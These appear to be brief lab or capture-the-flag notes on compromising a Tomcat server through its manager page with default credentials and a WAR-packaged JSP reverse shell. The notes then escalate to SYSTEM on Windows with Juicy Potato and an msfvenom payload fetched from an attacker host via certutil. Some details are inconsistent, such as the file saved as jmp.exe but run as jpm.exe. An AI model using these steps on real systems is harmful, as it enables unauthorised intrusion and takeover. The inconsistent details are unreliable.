Nmap showed only port 8080 open
visited, and clicked on something, asked for password. admin:admin worked, but admin doesnt have any priv to the manager-gui role, the user with manager-gui role is tomcat:s3cret
however, the key page is /manager/html, where we can upload a war file, which would be a malicious jsp
clone a jsp rev shell, call it rev.jsp
zip it into a war file
`zip rev.war rev.jsp`
visit /manager/html
upload the war file
visit /rev/rev.jsp while listening
rev shell!

---
whoami /priv shows SeImpersonate
systeminfo shows a 64-bit windows12 server
use the juicy potato, jp_main.exe
create a msfvenom payload, rshell.exe
Transfer both to the target machine
`certutil -urlcache -f "http://10.10.14.31:8990/rshell.exe" rshell.exe`
`certutil -urlcache -f "http://10.10.14.31:8990/jp_main.exe" jmp.exe`
`.\jpm.exe -l 1337 -c "{e60687f7-01a1-40aa-86ac-db1cbf673334}" -p rshell.exe -t *`
